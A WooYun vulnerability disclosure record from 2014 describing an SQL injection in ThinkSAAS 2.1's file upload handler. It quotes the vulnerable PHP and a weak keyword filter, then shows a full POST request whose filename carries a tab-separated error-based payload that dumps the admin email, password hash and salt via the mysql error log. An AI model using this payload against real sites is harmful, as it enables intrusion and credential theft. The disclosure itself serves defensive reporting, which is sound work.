{"id": 58474, "wybug_id": "wooyun-2014-051124", "wybug_title": "Thinksaas最新版注入无视GPC", "wybug_corp": "thinksaas.cn", "wybug_author": "phith0n", "wybug_date": "2014-02-20 13:04", "wybug_open_date": "2014-05-18 13:05", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-20：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向公众公开  简要描述： thinksaas最新版2.1某处sql注入修补不完善，继续注入。 详细说明：  Thinksaas是一款轻量级开源社区系统，界面我很喜欢。官网在http://www.thinksaas.cn/。说到无视GPC，大家想到什么。Get、Post、Cookie请求不好用的时候，还能用到什么？当然是SERVER或FILE。这个cms在全局文件中使用了addslashes对GET、POST、COOKIE进行了过滤，而且在操作数据库的函数中，在where的位置又用了mysql_real_escape_string，所以使得游戏变得很难。出问题的地方在会员上传资料处/app/attach/action/upload.php，这是上传资料处代码：\n...30行\tcase \"do\":\t\t\t\t$userid = intval($_GET['userid']);\t\t$albumid = intval($_GET['albumid']);\t\tif($userid=='0' || $albumid == 0){\t\t\techo '00000';\t\t\texit;\t\t}\t\t\t\t$attachid = $new['attach']->create('attach',array(\t\t\t'userid'\t=> $userid,\t\t\t'locationid'=>aac('user')->getLocationId($userid),\t\t\t'albumid'=>$albumid,\t\t\t'addtime'\t=> date('Y-m-d H:i:s'),\t\t));\t\t\t\t//上传\t\t$arrUpload = tsUpload($_FILES['Filedata'],$attachid,'attach',array('pptx','docx','pdf','jpg','gif','png','rar','zip','doc','ppt','txt'));\t\t\t\tif($arrUpload){\t\t\t$new['attach']->update('attach',array(\t\t\t\t'attachid'=>$attachid,\t\t\t),array(\t\t\t\t'attachname'=>$arrUpload['name'],\t\t\t\t'attachtype'=>$arrUpload['type'],\t\t\t\t'attachurl'=>$arrUpload['url'],\t\t\t\t'attachsize'=>$arrUpload['size'],\t\t\t));\t\t\t\t\t\t\t\t\t//对积分进行处理\t\t\taac('user')->doScore($app,$ac,$ts,$userid);\t\t\t\t\t\t\t\t}\t\t\t\techo $attachid;\t\t\t\tbreak;\n首先获取userid、albumid（这里还存在一个平衡权限问题，这算另一个漏洞），然后使用tsUpload函数对文件进行上传。$_FILES['Filedata']是上传表单的名字。我们进入这个函数：\n/** * ThinkSAAS专用上传函数 * @param unknown $files\t要上传的文件 如$_FILES['photo'] * @param unknown $projectid\t上传针对的项目id 如$userid * @param unknown $dir\t上传到目录 如 user * @param unknown $uptypes\t上传类型，数组 array('jpg','png','gif') * @return multitype:string unknown mixed |boolean\t返回数组：array('name'=>'','path'=>'','url'=>'','path'=>'','size'=>'') */function tsUpload($files, $projectid, $dir, $uptypes) {\tif ($files ['size'] > 0) {\t\t\t\t$menu2 = intval ( $projectid / 1000 );\t\t\t\t$menu1 = intval ( $menu2 / 1000 );\t\t\t\t$path = $menu1 . '/' . $menu2;\t\t\t\t$dest_dir = 'uploadfile/' . $dir . '/' . $path;\t\t\t\tcreateFolders ( $dest_dir );\t\t\t\t//$ext = pathinfo($files['name'],PATHINFO_EXTENSION);\t\t\t\t$arrType = explode ( '.', strtolower ( $files ['name'] ) ); // 转小写一下\t\t\t\t$type = array_pop ( $arrType );\t\t\t\tif (in_array ( $type, $uptypes )) {\t\t\t\t\t\t$name = $projectid . '.' . $type;\t\t\t\t\t\t$dest = $dest_dir . '/' . $name;\t\t\t\t\t\t// 先删除\t\t\tunlink ( $dest );\t\t\t// 后上传\t\t\tmove_uploaded_file ( $files ['tmp_name'], mb_convert_encoding ( $dest, \"gb2312\", \"UTF-8\" ) );\t\t\t\t\t\tchmod ( $dest, 0777 );\t\t\t\t\t\t$filesize = filesize ( $dest );\t\t\tif (intval ( $filesize ) > 0) {\t\t\t\treturn array (\t\t\t\t\t\t'name' => tsFilter($files ['name']),\t\t\t\t\t\t'path' => $path,\t\t\t\t\t\t'url' => $path . '/' . $name,\t\t\t\t\t\t'type' => $type,\t\t\t\t\t\t'size' => $files ['size'] \t\t\t\t);\t\t\t} else {\t\t\t\treturn false;\t\t\t}\t\t} else {\t\t\treturn false;\t\t}\t}}\n重点看到return array 那里，由后面的代码可知，这里返回的一个数组，之后用它就更新数据库(update)。第一个元素是’name’，也就是我们上传的文件名。有一个过滤的函数tsFilter，我们打开看看：\n/** * 针对特殊字符或者内容的特殊过滤 * @param unknown $value * @return Ambigous <string, mixed> */function tsFilter($value){\t$value = trim($value);\t//定义不允许提交的SQl命令和关键字\t$words = array();\t$words[] = \"add \";\t$words[] = \"and \";\t$words[] = \"count \";\t$words[] = \"order \";\t$words[] = \"table \";\t$words[] = \"by \";\t$words[] = \"create \";\t$words[] = \"delete \";\t$words[] = \"drop \";\t$words[] = \"from \";\t$words[] = \"grant \";\t$words[] = \"insert \";\t$words[] = \"select \";\t$words[] = \"truncate \";\t$words[] = \"update \";\t$words[] = \"use \";\t$words[] = \"--\";\t$words[] = \"#\";\t$words[] = \"group_concat\";\t$words[] = \"column_name\";\t$words[] = \"information_schema.columns\";\t$words[] = \"table_schema\";\t$words[] = \"union \";\t$words[] = \"where \";\t$words[] = \"alert\";\t$value = strtolower($value);//转换为小写\tforeach($words as $word){\t\tif(strstr($value,$word)){\t\t\t$value = str_replace($word,'',$value);\t\t}\t}\t\treturn $value;}\n看起来过滤了很多很多注入需要的关键字……可是仔细一看，过滤的是类似“select ”这种，关键字后面加了个空格。只要没有这个空格，我们还是能轻松注入。那么空格用什么代替？第一想到/**/，但这个cms中/会把句子截断，所以不好用（具体为什么查看其他代码）。第二个想到制表符，它能完美代替空格。回到第一段代码中，我们看到它把获得的name直接作为attachname带入update函数。$new['attach']->update('attach',array(\t\t\t\t'attachid'=>$attachid,\t\t\t),array(\t\t\t\t'attachname'=>$arrUpload['name'],\t\t\t\t'attachtype'=>$arrUpload['type'],\t\t\t\t'attachurl'=>$arrUpload['url'],\t\t\t\t'attachsize'=>$arrUpload['size'],\t\t\t));我们来看看update函数：\npublic function update($table, $conditions, $row) {\t\t$where = \"\";\t\tif (empty ( $row ))\t\t\treturn FALSE;\t\tif (is_array ( $conditions )) {\t\t\t$join = array ();\t\t\tforeach ( $conditions as $key => $condition ) {\t\t\t\t$condition = $this->escape ( $condition );\t\t\t\t$join [] = \"{$key} = {$condition}\";\t\t\t}\t\t\t$where = \"WHERE \" . join ( \" AND \", $join );\t\t} else {\t\t\tif (null != $conditions)\t\t\t\t$where = \"WHERE \" . $conditions;\t\t}\t\tforeach ( $row as $key => $value ) {\t\t\t$vals [] = \"`$key` = '$value'\";\t\t}\t\t$values = join ( \", \", $vals );\t\t$sql = \"UPDATE \" . dbprefix . \"{$table} SET {$values} {$where}\";\t\t//echo $sql;exit;\t\treturn $this->db->query ( $sql );\t}\n我们可以看到，where的位置使用escape函数，其实里面就是一个mysql_real_escape_string，但我们的注入点在'attachname'=’这个位置’，不在where里，所以不用担心。这个注入为update型注入，因为之前过滤了注释符，所以不好更新信息。不过可以通过报错的方式把管理员账号密码爆出来，这个cms还有一个特点，它虽然不会显示mysql错误，但会把错误保存在/logs/文件夹里，名字就是日期+-mysql-error.txt。这样，我们就可以看到mysql的报错信息，从而爆出得到管理员账号密码。   漏洞证明：  虽然在会员中心，但这个点不用注册即可触发。我在本地搭建一个最新版本v2.1\n\n向其发送如下数据包：POST /think/index.php?app=attach&ac=upload&ts=do&userid=1&albumid=1 HTTP/1.1Host: localhostUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------12264161285866Content-Length: 375-----------------------------12264161285866Content-Disposition: form-data; name=\"Filedata\"; filename=\"abb',a=(select\t1 from\t(select\tcount(*),concat((select\tconcat(email,0x23,pwd,0x23,salt) from\tts_user\tlimit\t0,1),floor(rand(0)*2))x from\tinformation_schema.tables\tgroup\tby\tx)p),b='.txt\"Content-Type: text/plainlet's go~-----------------------------12264161285866--注意，filename中都是制表符而不是空格。返回数据包似乎很正常：\n\n不过我们查看logs目录下的错误文件，因为今天是20140216，所以访问/logs/20140216-mysql-error.txt：\n\n已看到，第一个是管理员邮箱，第二个是密码，第三个是salt。但salt不全（应该限制了长度？），再单独打一次salt即可。后来我看到xfkxfk大牛曾经发的sql注入， WooYun: ThinkSAAS SQL注入漏洞 ，原来这个地方曾经修补过，就是增加了tsFilter函数过滤了一些常见关键字（包括注释符，弄得很蛋疼），但过滤的并不干净才又产生了这个问题，继续注入。   修复方案：  建议开发者使用mysql_real_escape_string转义文件名这个字段，彻底解决问题。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-05-18 13:05 厂商回复： 此漏洞有已白帽子在其他平台提交过，现已修复，谢谢您的反馈！再次感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-21 17:21 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @thinksaas.cn 因为乌云迟迟没有审核，才会提交到其他平台，抱歉。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}